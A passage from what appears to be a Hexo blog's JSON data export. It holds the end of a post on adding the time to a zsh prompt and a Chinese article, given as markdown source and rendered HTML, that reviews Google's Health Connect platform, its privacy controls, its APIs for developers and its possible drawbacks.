-e</span></span><br></pre></td></tr></table></figure>\n\n<p>打开后，内容如下，可以看见默认已经配置了一些插件，比如识别git分支信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PROMPT=&quot;%(?:%&#123;$fg_bold[green]%&#125;➜ :%&#123;$fg_bold[red]%&#125;➜ )&quot;</span><br><span class=\"line\">PROMPT+=&#x27; %&#123;$fg[cyan]%&#125;%c%&#123;$reset_color%&#125; $(git_prompt_info)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%&#123;$fg_bold[blue]%&#125;git:(%&#123;$fg[red]%&#125;&quot;</span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%&#123;$reset_color%&#125; &quot;</span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%&#123;$fg[blue]%&#125;) %&#123;$fg[yellow]%&#125;✗&quot;</span><br><span class=\"line\">ZSH_THEME_GIT_PROMPT_CLEAN=&quot;%&#123;$fg[blue]%&#125;)&quot;</span><br></pre></td></tr></table></figure>\n\n<p>这个就相当于你的命令前缀模板，要显示时间的话，达到和上图一样的效果，可在第二行添加：</p>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">……</span><br><span class=\"line\">PROMPT+=&quot;%D&#123;%H:%M:%S&#125;&quot;</span><br><span class=\"line\">……</span><br></pre></td></tr></table></figure>\n\n\n<p>保存后重启终端，就OK了！</p>\n<p>如果想要12小时制，就把<code>H</code>改成<code>L</code>。如果还需要显示年月日的话，补充一下即可：</p>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PROMPT+=&quot;%D&#123;%y/%m/%f&#125; %D&#123;%H:%M:%S&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n"},{"layout":"post","title":"当Google关心起你的健康数据","subtitle":"操碎了心的谷歌。","date":"2022-12-04T16:00:00.000Z","author":"YSY","header-style":"text","catalog":true,"cover":"2022/12/05/当Google关心起你的健康数据/image-20221120160304633.png","_content":"\n此文为初稿备份，终稿已发布于少数派：[https://sspai.com/post/77024](https://sspai.com/post/77024)\n\n---\n\n今年五月，在 Android 开发者[官方博客](https://android-developers.googleblog.com/2022/05/introducing-health-connect.html)中，Google 隆重介绍了一个新平台，名为 [Health Connect](https://developer.android.com/health-connect)，并推出了相应的 Android API。其官方网站用非常显眼的大标题和副标题简洁地描述了其核心功能与优势：**简化健康类应用之间的连接**。\n\n> Health Connect: simplify connectivity between apps\n>\n> Health and fitness apps record valuable data. With permission from your users, you can unlock the full potential of this data by combining it to generate powerful insights.\n\n粗略地看这应该是 Google 搞的一个平台化的东西。那么它具体是什么呢？又会给用户和开发者带来什么利益？\n\n### 什么是Health Connect\n\n如今健康和健身类的应用越来越多，各大厂商迅速占领这个细分市场，同时带动了可穿戴设备疯狂发展。众多类型的设备（包括智能手机和可穿戴设备）都搭载 Android 系统，许多健康应用都在 Android 设备上运行。同样地，Android 平台接口也提供各种各样的数据。但是，Android 用户希望通过单个数据库轻松便捷地掌控自己的健康与健身数据。作为开发者，在应用之间连接和共享这些数据也可以提升产品体验。然而，这些信息大多都分布在不同的地方，很难汇集在一起。\n\nGoogle 认为这就是痛点所在，所以他们在今年上半年推出了 Health Connect。本质上，**Health Connect 就是一套 Android API 和一个平台性质的独立应用**。它将来自多个设备和应用的数据整合到一个生态系统中。\n\n从 Health Connect 的整体设计架构示意图可以看出，它的实现原理也非常的简单，就是众多不同的三方应用通过 Health Connect 的 SDK 与一个中心化的平台应用进行跨进程通信，以共创共享数据。\n\n<img src=\"image-20221120141729514.png\" alt=\"image-20221120141729514\" style=\"zoom:50%;\" />\n\n### 给用户带来的好处\n\n如果 Health Connect 的生态能够如愿发展成熟，各大健康应用纷纷接入，会给广大用户带来哪些好处呢？\n\n#### 集中的数据管理\n\n除了基本的睡眠以外，跑步、骑车、爬山、冥想等活动正逐渐成为人们健康生活的一部分，大家也习惯下载各种细分领域的 App 来监测自己的健康和健身数据，比如运动距离、攀爬海拔高度、饮水量、体重、代谢率、心率、深浅睡眠时长等。这些数据往往产生自不同的时段，甚至不同的 App 会产生部分相同类型的数据，每次要查看它们都非常麻烦，不仅要同时打开多个 App，而且**数据还不一定连贯**。\n\n如果它们都接入了 Health Connect，不同来源的数据就会被整合到一起，方便用户直接在一个 App 里面集中查看和管理所有类型的信息。\n\n<img src=\"image-20221120150839605.png\" alt=\"image-20221120150839605\" style=\"zoom:50%;\" />\n\n此外，还有个比较隐藏的优势便是用户可以借助该平台完成健康**数据的迁移**。比如当我们想在一款新的跑步应用 B 中继承使用旧应用 A 的步数信息时，Health Connect 就充当了一个公共信息通道的角色，B 可以直接读取 A 之前写入的数据。\n\n#### 方便的权限控制\n\n用户安装了 Health Connect 之后，可以轻松和细粒度地掌控不同 App 的数据使用权限，从此不仅是数据的生产者，也是数据真正的主人了。\n\n当我们觉得某些应用数据不需要或者不可靠时，可以禁止它的数据写入权限。在某些同质化比较严重的功能场景下，我们还可以自由地选择把数据读取权限授予某个 App，而禁止其他 App 访问。\n\n在如此清晰的呈现之下，数据的“生杀大权”交到了用户手中，既提高了用户对这类隐私数据的敏感性，也有效地避免了应用对传感器数据的滥用。\n\n<img src=\"image-20221120151843600.png\" alt=\"image-20221120151843600\" style=\"zoom:50%;\" />\n\n#### 可靠的隐私保障\n\n现在一些记录和分析女性生理周期的 App 越来越多，虽然都打着关爱女性健康的名号，但用户总会担心它们不能提供可靠的数据安全保障，而这类数据往往比其他健康数据更具私密性。\n\n如果女生们只选择完全接入了 Health Connect 的相关 App，那么这个问题就能得到很好的解决。因为 Health Connect 本身并不支持 Google 云同步，它只是一个**加密**的本地数据仓库，当它提供数据给三方 App 之前，除了用户可以自主管控外，**也有完备的隐私政策限制与对三方 App 的安全性评估**。\n\n在[Health Connect 政策要求常见问题解答](https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/health-connect-policy-requirement-faqs)中，我们可以了解到详细的政策细节，其内容开头也做了精简的描述：\n\n> Health Connect 应用会收集健康与健身数据，这可能包含个人数据和敏感数据。应用必须符合特定的政策要求，才能在 Health Connect 中读取和写入数据。\n\n有了严格的审核机制和法律的保障，安心程度会提高不少。\n\n### 如何使用Health Connect\n\n对用户而言非常简单，只需要去 Google Play 下载安装 Health Connect 应用即可。需要注意的是，安装之后并不会像普通应用那样显示桌面图标，官方文档也提到了这一点：\n\n> **注意**：Health Connect 默认不再显示在主屏幕上。如需打开 Health Connect，请前往**设置 > 应用 > Health Connect**或将 Health Connect 添加到您的**快捷设置**菜单。\n\n如果希望快速打开的话，可以考虑通过 AppManager 之类的三方应用自行创建快捷方式入口。\n\n<img src=\"image-20221120155109377.png\" alt=\"image-20221120155109377\" style=\"zoom:50%;\" />\n\nHealth Connect 现在还在 Beta 阶段，安装之后如下图所示。我们可以看出来它非常的简洁，表现得更像是一个系统应用，一致的设计风格也让人自然地认为它是系统设置的一部分。\n\n<img src=\"image-20221120155738720.png\" alt=\"image-20221120155738720\" style=\"zoom:33%;\" /><img src=\"image-20221120155946465.png\" alt=\"image-20221120155946465\" style=\"zoom:33%;\" /><img src=\"image-20221120155830420.png\" alt=\"image-20221120155830420\" style=\"zoom:33%;\" />\n\n当你平时使用的健康健身类应用适配了 Health Connect API 之后，你就能愉快地享受这个平台带来的安全与便利了。虽然今年才推出，但目前[支持的应用](https://play.google.com/store/apps/collection/promotion_all__health_connect?clp=CiUKIwodcHJvbW90aW9uX2FsbF9faGVhbHRoX2Nvbm5lY3QQShgD:S:ANO1ljI8MHs&gsr=CicKJQojCh1wcm9tb3Rpb25fYWxsX19oZWFsdGhfY29ubmVjdBBKGAM=:S:ANO1ljLsSuU)还不算少：\n\n![image-20221120160304633](image-20221120160304633.png)\n\n对开发者而言，[官方技术文档](https://developer.android.com/guide/health-and-fitness/health-connect/get-started)非常的清晰，甚至还有 Demo，只需要几步即可接入使用：\n\n- 在你的 Android 应用中集成 Health Connect SDK\n- 声明所需权限并向用户请求\n- 调用 Health Connect API 进行 CRUD 操作\n\n唯一较多的工作量可能就是把应用自身采集到的健康数据，按 Health Connect **标准化**要求的格式进行转化并写入，所以理解这一套标准化的[数据类型和格式](https://developer.android.com/guide/health-and-fitness/health-connect/data-and-data-types/introduction)至关重要。此外，API 所包含的公共方法目前也很简单，从字面意思就能略知一二，举例几个关键 function：\n\n- aggregateGroupByDuration\n- aggregateGroupByPeriod\n- deleteRecords（注：只能删除某应用自己写入的部分）\n- getChanges\n- insertRecords\n- readRecord\n- updateRecords\n\n接口含义清晰，对开发者来说还是比较友好的。\n\n### 给开发者带来的收益\n\n收益可以分两方面讲，一是研发成本，二是用户体验。\n\n首先，对健康健身类应用的开发者而言，成本肯定是大大降低了。接入方便，逻辑简单，且有 Google 官方的技术支持。如果你的应用仅仅只想做数据分析，在过去你不得不先去采集用户的健康数据，现在却可以完全依赖 Health Connect，不再需要调用与传感器（Sensor）相关的一系列高功耗接口，只需查询 Health Connect 存储整合好的数据即可。这对初创者来说无疑是一个福音。\n\n除了降低应用的功耗本身就能提升用户的体验之外，开发者还可以通过 Health Connect 获取其他自己采集不到或者没必要采集的数据，为用户提供更加全面的分析结果。例如多个不同功能的应用在不同的时段进行了睡眠数据的采集，在 Health Connect 的帮助下，会整合到一起形成一个连贯的数据，提供任意时段的查询。\n\nGoogle 为了推广 Health Connect 还专门撰写了一个[用户体验开发指南](https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/ux-developer-guidance)，为开发者提供建议如何引导用户理解 Health Connect 的优势。当用户理解到例如隐私方面的好处之后，自然会更愿意使用接入了 Health Connect 的应用，这是一个良性循环。\n\n### 可能存在的问题\n\n敏锐的你看到这里，应该意识到了一些隐含问题。Google 的这个 Health Connect 虽然拥有美好的愿景和诸多优点，但肯定不是没有缺点的。我可以简单地列举一下目前能想到的一些问题：\n\n1. 在信息孤岛无数的今天，数据可谓无价，谁愿意把自家 App 采集和处理好的数据写入到 Health Connect 这个“数据共享中心”？恐怕对于绝大多数商业化开发者来说，动机不强，毕竟大家都想做那个索取者而不是贡献者。\n2. 作为开发者，从 Health Connect 获取的收益是不可知且不稳定的，取决于它的普及率，如果市面上接入的三方应用较少，就意味着数据来源少，此外如果用户不听从引导安装 Health Connect 平台应用，开发者仍然需要制定一套备份方案，似乎研发成本不降反升。\n3. Health Connect 目前有最多查询30天数据的范围限制，这并不一定能满足所有应用的业务需求。Google 想要在健康数据格式上做大一统，可能也难以考虑到所有细节情况。\n4. 如何避免数据污染？比如三方应用接入 Health Connect 后，恶意写入错误的数据。\n\n针对这些问题，也不是完全无解。其中第2点和第3点都是客观情况，短期无法改变，普及率是一个时间问题，或者说资源的投入问题，功能限制也只能在开发者和用户的不断反馈中逐步优化了。\n\n对于第1点，我猜测 Google 的算盘是这样的：由实力雄厚的大团队来扮演数据贡献者的身份，比如上图中的三星健康和 Google 健身，它们将可靠的健康数据写入到 Health Connect 中，其他中小团队就可以共享这些数据，如此一来降低了后者获取数据的成本，且随着行业数据标准化，会吸引更多团队加入。同时也是为了达到减少碎片化，提升用户体验的目的。\n\n对于第4点，也算是一个客观的问题，我暂时想不到完美的办法，估计只能通过平台机制优化或者应用审核来解决了。\n\n总的来说，Health Connect 的诞生有一个好的初衷，这也算是 Google 致力于解决应用生态碎片化的一环。站在 Android 系统这一层面来看，健康应用的开发者们正在生产大量的重复数据，浪费了用户的电池和存储空间。因此，Google 想要打造一个标准化的本地仓库来统一管控健康数据，为用户提供更好的体验，也不失为一个好的方向。\n\n### 来自官方团队的回答\n\n心血来潮，我把上面的4个问题整理了一封邮件发给 Health Connect 官方团队：\n\n<img src=\"283aeec8-9d96-4a2e-8a8c-28982fba6892.jpeg\" alt=\"283aeec8-9d96-4a2e-8a8c-28982fba6892\" style=\"zoom:40%;\" />\n\n很快便收到回复，说请我等待，他去找 Leader，我颇为震惊。几天后，Leader 还真的认真回复了我的问题，不得不佩服他们的敬业（可能是闲）：\n\n<img src=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8.jpeg\" alt=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8\" style=\"zoom:50%;\" />\n\n可以说，这位 Leader 的回复基本上详尽解答了我的那几个疑问。Google 方面主要还是通过政策和审核来严格管控接入方，避免数据不可信和污染的问题，并且和我猜测的一致，官方还是倾向于他们自己和大型合作方的应用来充当数据贡献者的身份。此外，回复中还提到一个我之前没关注到的点，就是每份数据都有 Data Origin，可以帮助用户很好地追溯数据来源，一定程度上也能避免恶意应用的干扰。\n","source":"_posts/2022-12-05-当Google关心起你的健康数据.md","raw":"---\nlayout:     post\ntitle:      当Google关心起你的健康数据\nsubtitle:   操碎了心的谷歌。\ndate:       2022-12-05\nauthor:     YSY\nheader-style: text\ncatalog: true\ncover: image-20221120160304633.png\ntags:\n    - Android\n    - AOSP\n---\n\n此文为初稿备份，终稿已发布于少数派：[https://sspai.com/post/77024](https://sspai.com/post/77024)\n\n---\n\n今年五月，在 Android 开发者[官方博客](https://android-developers.googleblog.com/2022/05/introducing-health-connect.html)中，Google 隆重介绍了一个新平台，名为 [Health Connect](https://developer.android.com/health-connect)，并推出了相应的 Android API。其官方网站用非常显眼的大标题和副标题简洁地描述了其核心功能与优势：**简化健康类应用之间的连接**。\n\n> Health Connect: simplify connectivity between apps\n>\n> Health and fitness apps record valuable data. With permission from your users, you can unlock the full potential of this data by combining it to generate powerful insights.\n\n粗略地看这应该是 Google 搞的一个平台化的东西。那么它具体是什么呢？又会给用户和开发者带来什么利益？\n\n### 什么是Health Connect\n\n如今健康和健身类的应用越来越多，各大厂商迅速占领这个细分市场，同时带动了可穿戴设备疯狂发展。众多类型的设备（包括智能手机和可穿戴设备）都搭载 Android 系统，许多健康应用都在 Android 设备上运行。同样地，Android 平台接口也提供各种各样的数据。但是，Android 用户希望通过单个数据库轻松便捷地掌控自己的健康与健身数据。作为开发者，在应用之间连接和共享这些数据也可以提升产品体验。然而，这些信息大多都分布在不同的地方，很难汇集在一起。\n\nGoogle 认为这就是痛点所在，所以他们在今年上半年推出了 Health Connect。本质上，**Health Connect 就是一套 Android API 和一个平台性质的独立应用**。它将来自多个设备和应用的数据整合到一个生态系统中。\n\n从 Health Connect 的整体设计架构示意图可以看出，它的实现原理也非常的简单，就是众多不同的三方应用通过 Health Connect 的 SDK 与一个中心化的平台应用进行跨进程通信，以共创共享数据。\n\n<img src=\"image-20221120141729514.png\" alt=\"image-20221120141729514\" style=\"zoom:50%;\" />\n\n### 给用户带来的好处\n\n如果 Health Connect 的生态能够如愿发展成熟，各大健康应用纷纷接入，会给广大用户带来哪些好处呢？\n\n#### 集中的数据管理\n\n除了基本的睡眠以外，跑步、骑车、爬山、冥想等活动正逐渐成为人们健康生活的一部分，大家也习惯下载各种细分领域的 App 来监测自己的健康和健身数据，比如运动距离、攀爬海拔高度、饮水量、体重、代谢率、心率、深浅睡眠时长等。这些数据往往产生自不同的时段，甚至不同的 App 会产生部分相同类型的数据，每次要查看它们都非常麻烦，不仅要同时打开多个 App，而且**数据还不一定连贯**。\n\n如果它们都接入了 Health Connect，不同来源的数据就会被整合到一起，方便用户直接在一个 App 里面集中查看和管理所有类型的信息。\n\n<img src=\"image-20221120150839605.png\" alt=\"image-20221120150839605\" style=\"zoom:50%;\" />\n\n此外，还有个比较隐藏的优势便是用户可以借助该平台完成健康**数据的迁移**。比如当我们想在一款新的跑步应用 B 中继承使用旧应用 A 的步数信息时，Health Connect 就充当了一个公共信息通道的角色，B 可以直接读取 A 之前写入的数据。\n\n#### 方便的权限控制\n\n用户安装了 Health Connect 之后，可以轻松和细粒度地掌控不同 App 的数据使用权限，从此不仅是数据的生产者，也是数据真正的主人了。\n\n当我们觉得某些应用数据不需要或者不可靠时，可以禁止它的数据写入权限。在某些同质化比较严重的功能场景下，我们还可以自由地选择把数据读取权限授予某个 App，而禁止其他 App 访问。\n\n在如此清晰的呈现之下，数据的“生杀大权”交到了用户手中，既提高了用户对这类隐私数据的敏感性，也有效地避免了应用对传感器数据的滥用。\n\n<img src=\"image-20221120151843600.png\" alt=\"image-20221120151843600\" style=\"zoom:50%;\" />\n\n#### 可靠的隐私保障\n\n现在一些记录和分析女性生理周期的 App 越来越多，虽然都打着关爱女性健康的名号，但用户总会担心它们不能提供可靠的数据安全保障，而这类数据往往比其他健康数据更具私密性。\n\n如果女生们只选择完全接入了 Health Connect 的相关 App，那么这个问题就能得到很好的解决。因为 Health Connect 本身并不支持 Google 云同步，它只是一个**加密**的本地数据仓库，当它提供数据给三方 App 之前，除了用户可以自主管控外，**也有完备的隐私政策限制与对三方 App 的安全性评估**。\n\n在[Health Connect 政策要求常见问题解答](https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/health-connect-policy-requirement-faqs)中，我们可以了解到详细的政策细节，其内容开头也做了精简的描述：\n\n> Health Connect 应用会收集健康与健身数据，这可能包含个人数据和敏感数据。应用必须符合特定的政策要求，才能在 Health Connect 中读取和写入数据。\n\n有了严格的审核机制和法律的保障，安心程度会提高不少。\n\n### 如何使用Health Connect\n\n对用户而言非常简单，只需要去 Google Play 下载安装 Health Connect 应用即可。需要注意的是，安装之后并不会像普通应用那样显示桌面图标，官方文档也提到了这一点：\n\n> **注意**：Health Connect 默认不再显示在主屏幕上。如需打开 Health Connect，请前往**设置 > 应用 > Health Connect**或将 Health Connect 添加到您的**快捷设置**菜单。\n\n如果希望快速打开的话，可以考虑通过 AppManager 之类的三方应用自行创建快捷方式入口。\n\n<img src=\"image-20221120155109377.png\" alt=\"image-20221120155109377\" style=\"zoom:50%;\" />\n\nHealth Connect 现在还在 Beta 阶段，安装之后如下图所示。我们可以看出来它非常的简洁，表现得更像是一个系统应用，一致的设计风格也让人自然地认为它是系统设置的一部分。\n\n<img src=\"image-20221120155738720.png\" alt=\"image-20221120155738720\" style=\"zoom:33%;\" /><img src=\"image-20221120155946465.png\" alt=\"image-20221120155946465\" style=\"zoom:33%;\" /><img src=\"image-20221120155830420.png\" alt=\"image-20221120155830420\" style=\"zoom:33%;\" />\n\n当你平时使用的健康健身类应用适配了 Health Connect API 之后，你就能愉快地享受这个平台带来的安全与便利了。虽然今年才推出，但目前[支持的应用](https://play.google.com/store/apps/collection/promotion_all__health_connect?clp=CiUKIwodcHJvbW90aW9uX2FsbF9faGVhbHRoX2Nvbm5lY3QQShgD:S:ANO1ljI8MHs&gsr=CicKJQojCh1wcm9tb3Rpb25fYWxsX19oZWFsdGhfY29ubmVjdBBKGAM=:S:ANO1ljLsSuU)还不算少：\n\n![image-20221120160304633](image-20221120160304633.png)\n\n对开发者而言，[官方技术文档](https://developer.android.com/guide/health-and-fitness/health-connect/get-started)非常的清晰，甚至还有 Demo，只需要几步即可接入使用：\n\n- 在你的 Android 应用中集成 Health Connect SDK\n- 声明所需权限并向用户请求\n- 调用 Health Connect API 进行 CRUD 操作\n\n唯一较多的工作量可能就是把应用自身采集到的健康数据，按 Health Connect **标准化**要求的格式进行转化并写入，所以理解这一套标准化的[数据类型和格式](https://developer.android.com/guide/health-and-fitness/health-connect/data-and-data-types/introduction)至关重要。此外，API 所包含的公共方法目前也很简单，从字面意思就能略知一二，举例几个关键 function：\n\n- aggregateGroupByDuration\n- aggregateGroupByPeriod\n- deleteRecords（注：只能删除某应用自己写入的部分）\n- getChanges\n- insertRecords\n- readRecord\n- updateRecords\n\n接口含义清晰，对开发者来说还是比较友好的。\n\n### 给开发者带来的收益\n\n收益可以分两方面讲，一是研发成本，二是用户体验。\n\n首先，对健康健身类应用的开发者而言，成本肯定是大大降低了。接入方便，逻辑简单，且有 Google 官方的技术支持。如果你的应用仅仅只想做数据分析，在过去你不得不先去采集用户的健康数据，现在却可以完全依赖 Health Connect，不再需要调用与传感器（Sensor）相关的一系列高功耗接口，只需查询 Health Connect 存储整合好的数据即可。这对初创者来说无疑是一个福音。\n\n除了降低应用的功耗本身就能提升用户的体验之外，开发者还可以通过 Health Connect 获取其他自己采集不到或者没必要采集的数据，为用户提供更加全面的分析结果。例如多个不同功能的应用在不同的时段进行了睡眠数据的采集，在 Health Connect 的帮助下，会整合到一起形成一个连贯的数据，提供任意时段的查询。\n\nGoogle 为了推广 Health Connect 还专门撰写了一个[用户体验开发指南](https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/ux-developer-guidance)，为开发者提供建议如何引导用户理解 Health Connect 的优势。当用户理解到例如隐私方面的好处之后，自然会更愿意使用接入了 Health Connect 的应用，这是一个良性循环。\n\n### 可能存在的问题\n\n敏锐的你看到这里，应该意识到了一些隐含问题。Google 的这个 Health Connect 虽然拥有美好的愿景和诸多优点，但肯定不是没有缺点的。我可以简单地列举一下目前能想到的一些问题：\n\n1. 在信息孤岛无数的今天，数据可谓无价，谁愿意把自家 App 采集和处理好的数据写入到 Health Connect 这个“数据共享中心”？恐怕对于绝大多数商业化开发者来说，动机不强，毕竟大家都想做那个索取者而不是贡献者。\n2. 作为开发者，从 Health Connect 获取的收益是不可知且不稳定的，取决于它的普及率，如果市面上接入的三方应用较少，就意味着数据来源少，此外如果用户不听从引导安装 Health Connect 平台应用，开发者仍然需要制定一套备份方案，似乎研发成本不降反升。\n3. Health Connect 目前有最多查询30天数据的范围限制，这并不一定能满足所有应用的业务需求。Google 想要在健康数据格式上做大一统，可能也难以考虑到所有细节情况。\n4. 如何避免数据污染？比如三方应用接入 Health Connect 后，恶意写入错误的数据。\n\n针对这些问题，也不是完全无解。其中第2点和第3点都是客观情况，短期无法改变，普及率是一个时间问题，或者说资源的投入问题，功能限制也只能在开发者和用户的不断反馈中逐步优化了。\n\n对于第1点，我猜测 Google 的算盘是这样的：由实力雄厚的大团队来扮演数据贡献者的身份，比如上图中的三星健康和 Google 健身，它们将可靠的健康数据写入到 Health Connect 中，其他中小团队就可以共享这些数据，如此一来降低了后者获取数据的成本，且随着行业数据标准化，会吸引更多团队加入。同时也是为了达到减少碎片化，提升用户体验的目的。\n\n对于第4点，也算是一个客观的问题，我暂时想不到完美的办法，估计只能通过平台机制优化或者应用审核来解决了。\n\n总的来说，Health Connect 的诞生有一个好的初衷，这也算是 Google 致力于解决应用生态碎片化的一环。站在 Android 系统这一层面来看，健康应用的开发者们正在生产大量的重复数据，浪费了用户的电池和存储空间。因此，Google 想要打造一个标准化的本地仓库来统一管控健康数据，为用户提供更好的体验，也不失为一个好的方向。\n\n### 来自官方团队的回答\n\n心血来潮，我把上面的4个问题整理了一封邮件发给 Health Connect 官方团队：\n\n<img src=\"283aeec8-9d96-4a2e-8a8c-28982fba6892.jpeg\" alt=\"283aeec8-9d96-4a2e-8a8c-28982fba6892\" style=\"zoom:40%;\" />\n\n很快便收到回复，说请我等待，他去找 Leader，我颇为震惊。几天后，Leader 还真的认真回复了我的问题，不得不佩服他们的敬业（可能是闲）：\n\n<img src=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8.jpeg\" alt=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8\" style=\"zoom:50%;\" />\n\n可以说，这位 Leader 的回复基本上详尽解答了我的那几个疑问。Google 方面主要还是通过政策和审核来严格管控接入方，避免数据不可信和污染的问题，并且和我猜测的一致，官方还是倾向于他们自己和大型合作方的应用来充当数据贡献者的身份。此外，回复中还提到一个我之前没关注到的点，就是每份数据都有 Data Origin，可以帮助用户很好地追溯数据来源，一定程度上也能避免恶意应用的干扰。\n","slug":"当Google关心起你的健康数据","published":1,"updated":"2024-03-25T07:31:25.989Z","comments":1,"photos":[],"link":"","_id":"cluaufh1m0051the6glvxcxlf","content":"<p>此文为初稿备份，终稿已发布于少数派：<a href=\"https://sspai.com/post/77024\">https://sspai.com/post/77024</a></p>\n<hr>\n<p>今年五月，在 Android 开发者<a href=\"https://android-developers.googleblog.com/2022/05/introducing-health-connect.html\">官方博客</a>中，Google 隆重介绍了一个新平台，名为 <a href=\"https://developer.android.com/health-connect\">Health Connect</a>，并推出了相应的 Android API。其官方网站用非常显眼的大标题和副标题简洁地描述了其核心功能与优势：<strong>简化健康类应用之间的连接</strong>。</p>\n<blockquote>\n<p>Health Connect: simplify connectivity between apps</p>\n<p>Health and fitness apps record valuable data. With permission from your users, you can unlock the full potential of this data by combining it to generate powerful insights.</p>\n</blockquote>\n<p>粗略地看这应该是 Google 搞的一个平台化的东西。那么它具体是什么呢？又会给用户和开发者带来什么利益？</p>\n<h3 id=\"什么是Health-Connect\"><a href=\"#什么是Health-Connect\" class=\"headerlink\" title=\"什么是Health Connect\"></a>什么是Health Connect</h3><p>如今健康和健身类的应用越来越多，各大厂商迅速占领这个细分市场，同时带动了可穿戴设备疯狂发展。众多类型的设备（包括智能手机和可穿戴设备）都搭载 Android 系统，许多健康应用都在 Android 设备上运行。同样地，Android 平台接口也提供各种各样的数据。但是，Android 用户希望通过单个数据库轻松便捷地掌控自己的健康与健身数据。作为开发者，在应用之间连接和共享这些数据也可以提升产品体验。然而，这些信息大多都分布在不同的地方，很难汇集在一起。</p>\n<p>Google 认为这就是痛点所在，所以他们在今年上半年推出了 Health Connect。本质上，<strong>Health Connect 就是一套 Android API 和一个平台性质的独立应用</strong>。它将来自多个设备和应用的数据整合到一个生态系统中。</p>\n<p>从 Health Connect 的整体设计架构示意图可以看出，它的实现原理也非常的简单，就是众多不同的三方应用通过 Health Connect 的 SDK 与一个中心化的平台应用进行跨进程通信，以共创共享数据。</p>\n<img src=\"image-20221120141729514.png\" alt=\"image-20221120141729514\" style=\"zoom:50%;\" />\n\n<h3 id=\"给用户带来的好处\"><a href=\"#给用户带来的好处\" class=\"headerlink\" title=\"给用户带来的好处\"></a>给用户带来的好处</h3><p>如果 Health Connect 的生态能够如愿发展成熟，各大健康应用纷纷接入，会给广大用户带来哪些好处呢？</p>\n<h4 id=\"集中的数据管理\"><a href=\"#集中的数据管理\" class=\"headerlink\" title=\"集中的数据管理\"></a>集中的数据管理</h4><p>除了基本的睡眠以外，跑步、骑车、爬山、冥想等活动正逐渐成为人们健康生活的一部分，大家也习惯下载各种细分领域的 App 来监测自己的健康和健身数据，比如运动距离、攀爬海拔高度、饮水量、体重、代谢率、心率、深浅睡眠时长等。这些数据往往产生自不同的时段，甚至不同的 App 会产生部分相同类型的数据，每次要查看它们都非常麻烦，不仅要同时打开多个 App，而且<strong>数据还不一定连贯</strong>。</p>\n<p>如果它们都接入了 Health Connect，不同来源的数据就会被整合到一起，方便用户直接在一个 App 里面集中查看和管理所有类型的信息。</p>\n<img src=\"image-20221120150839605.png\" alt=\"image-20221120150839605\" style=\"zoom:50%;\" />\n\n<p>此外，还有个比较隐藏的优势便是用户可以借助该平台完成健康<strong>数据的迁移</strong>。比如当我们想在一款新的跑步应用 B 中继承使用旧应用 A 的步数信息时，Health Connect 就充当了一个公共信息通道的角色，B 可以直接读取 A 之前写入的数据。</p>\n<h4 id=\"方便的权限控制\"><a href=\"#方便的权限控制\" class=\"headerlink\" title=\"方便的权限控制\"></a>方便的权限控制</h4><p>用户安装了 Health Connect 之后，可以轻松和细粒度地掌控不同 App 的数据使用权限，从此不仅是数据的生产者，也是数据真正的主人了。</p>\n<p>当我们觉得某些应用数据不需要或者不可靠时，可以禁止它的数据写入权限。在某些同质化比较严重的功能场景下，我们还可以自由地选择把数据读取权限授予某个 App，而禁止其他 App 访问。</p>\n<p>在如此清晰的呈现之下，数据的“生杀大权”交到了用户手中，既提高了用户对这类隐私数据的敏感性，也有效地避免了应用对传感器数据的滥用。</p>\n<img src=\"image-20221120151843600.png\" alt=\"image-20221120151843600\" style=\"zoom:50%;\" />\n\n<h4 id=\"可靠的隐私保障\"><a href=\"#可靠的隐私保障\" class=\"headerlink\" title=\"可靠的隐私保障\"></a>可靠的隐私保障</h4><p>现在一些记录和分析女性生理周期的 App 越来越多，虽然都打着关爱女性健康的名号，但用户总会担心它们不能提供可靠的数据安全保障，而这类数据往往比其他健康数据更具私密性。</p>\n<p>如果女生们只选择完全接入了 Health Connect 的相关 App，那么这个问题就能得到很好的解决。因为 Health Connect 本身并不支持 Google 云同步，它只是一个<strong>加密</strong>的本地数据仓库，当它提供数据给三方 App 之前，除了用户可以自主管控外，<strong>也有完备的隐私政策限制与对三方 App 的安全性评估</strong>。</p>\n<p>在<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/health-connect-policy-requirement-faqs\">Health Connect 政策要求常见问题解答</a>中，我们可以了解到详细的政策细节，其内容开头也做了精简的描述：</p>\n<blockquote>\n<p>Health Connect 应用会收集健康与健身数据，这可能包含个人数据和敏感数据。应用必须符合特定的政策要求，才能在 Health Connect 中读取和写入数据。</p>\n</blockquote>\n<p>有了严格的审核机制和法律的保障，安心程度会提高不少。</p>\n<h3 id=\"如何使用Health-Connect\"><a href=\"#如何使用Health-Connect\" class=\"headerlink\" title=\"如何使用Health Connect\"></a>如何使用Health Connect</h3><p>对用户而言非常简单，只需要去 Google Play 下载安装 Health Connect 应用即可。需要注意的是，安装之后并不会像普通应用那样显示桌面图标，官方文档也提到了这一点：</p>\n<blockquote>\n<p><strong>注意</strong>：Health Connect 默认不再显示在主屏幕上。如需打开 Health Connect，请前往<strong>设置 &gt; 应用 &gt; Health Connect</strong>或将 Health Connect 